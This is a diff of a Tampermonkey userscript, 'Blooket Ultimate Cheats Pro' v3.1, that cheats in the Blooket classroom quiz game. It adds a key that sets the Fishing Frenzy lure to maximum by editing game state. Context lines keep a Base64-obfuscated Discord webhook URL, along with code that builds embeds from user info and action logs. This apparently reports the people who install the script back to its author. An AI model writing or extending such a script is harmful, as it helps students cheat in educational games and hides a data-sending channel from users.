@@ -1,8 +1,8 @@
 // ==UserScript==
-// @name         Blooket Ultimate Cheats Pro v3
+// @name         Blooket Ultimate Cheats Pro v3.1
 // @namespace    http://tampermonkey.net/
-// @version      3.0
-// @description  F:Frenzy, D:Distraction, A:Auto Answer, B:Use Any Blook, R:Remove Hack, G:Chest ESP, C:Remove Bad Choices, Q:Always Quadruple
+// @version      3.1
+// @description  F:Frenzy, D:Distraction, A:Auto Answer, B:Use Any Blook, R:Remove Hack, G:Chest ESP, C:Remove Bad Choices, Q:Always Quadruple, L:Set Lure to 5 (Fishing Frenzy)
 // @author       Cheat Script
 // @match        *://*.blooket.com/*
 // @grant        GM_xmlhttpRequest
@@ -13,14 +13,8 @@
 (function() {
     'use strict';
     
-    console.log('🎮 Blooket Ultimate Cheats Pro v3 loaded from GitHub!');
-    
-    // Your existing cheat code goes here (the entire original script)
-    // Starting from the line: "// Gecodeerde Discord webhook URL (Base64)"
-    // All the way to the end of your original script
-    
-    // Note: Since you asked for the 2 scripts, I'm including the original cheat code here
-    // but shortened to fit the character limit. You should paste your entire original script here.
+    console.log('🎮 Blooket Ultimate Cheats Pro v3.1 loaded from GitHub!');
+    console.log('New: L-key - Set Lure to 5 (Fishing Frenzy)');
     
     // Gecodeerde Discord webhook URL (Base64)
     const ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NjQ2NTAwMjY2MzA1MTQzNS9wdHQyX1B0VFRHWTZ1V2twZlF2ZjV6VFZ5SFVJbmpqVTlmeDF4SEI3YmZidnYtMV9hLWRobjM1WGZtOTBhZ05xWUhmSGY=";
@@ -257,7 +251,7 @@
                         }
                     ],
                     footer: {
-                        text: "Blooket Ultimate Cheats Pro v3"
+                        text: "Blooket Ultimate Cheats Pro v3.1"
                     },
                     timestamp: new Date().toISOString()
                 };
@@ -285,7 +279,7 @@
     
     // Wacht 3 seconden zodat de game kan laden
     setTimeout(function() {
-        console.log('🎮 Blooket Ultimate Cheats Pro v3 geladen!');
+        console.log('🎮 Blooket Ultimate Cheats Pro v3.1 geladen!');
         console.log('F-toets: Activeer Frenzy (Fishing Frenzy)');
         console.log('D-toets: Stuur Distraction (Fishing Frenzy)');
         console.log('A-toets: Auto Answer (Quiz Games)');
@@ -294,6 +288,7 @@
         console.log('G-toets: Chest ESP (Gold Quest)');
         console.log('C-toets: Remove Bad Choices (Gold Quest)');
         console.log('Q-toets: Always Quadruple (Gold Quest/Crypto Hack/Dinos)');
+        console.log('L-toets: Set Lure to 5 (Fishing Frenzy)');
         console.log('🎯 Auto: Use Any Blook automatisch in lobby');
         
         // Initializeer user info
@@ -340,6 +335,10 @@
                     e.preventDefault();
                     console.log('🔄 Always Quadruple wordt uitgevoerd...');
                     executeAlwaysQuadruple();
+                } else if (key === 'l') {
+                    e.preventDefault();
+                    console.log('🔄 Set Lure to 5 wordt uitgevoerd...');
+                    executeSetLure5();
                 }
             }
         });
@@ -357,6 +356,33 @@
         }).observe(document, { subtree: true, childList: true });
         
     }, 3000);
+    
+    // NEW FUNCTION: Set Lure to 5 (Fishing Frenzy)
+    function executeSetLure5() {
+        try {
+            // Check if we're in Fishing Frenzy
+            const currentUrl = window.location.href;
+            if (!currentUrl.includes('fishingfrenzy')) {
+                console.log('⚠️ Set Lure to 5 werkt alleen in Fishing Frenzy');
+                addToLogBuffer("Set Lure 5", "Werkt alleen in Fishing Frenzy");
+                return;
+            }
+            
+            const gameState = findGameState();
+            if (gameState && gameState.setState) {
+                // Set lure to 5 (game uses 0-4 for lures 1-5, so set to 4 for lure 5)
+                gameState.setState({ lure: 4 });
+                console.log('✅ Lure set to 5 (maximum)');
+                addToLogBuffer("Set Lure 5", "Lure set to 5 (maximum)");
+            } else {
+                console.log('⚠️ Game state niet gevonden. Ben je in een Fishing Frenzy spel?');
+                addToLogBuffer("Set Lure 5", "Game state niet gevonden");
+            }
+        } catch (error) {
+            console.log('❌ Fout bij set lure to 5:', error);
+            addToLogBuffer("Set Lure 5 Fout", error.message);
+        }
+    }
     
     // Functies voor Always Quadruple
     function executeAlwaysQuadruple() {
